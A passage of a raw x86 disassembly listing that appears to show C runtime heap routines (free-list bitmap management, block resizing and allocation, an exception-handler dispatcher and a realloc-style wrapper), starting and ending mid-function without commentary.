  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
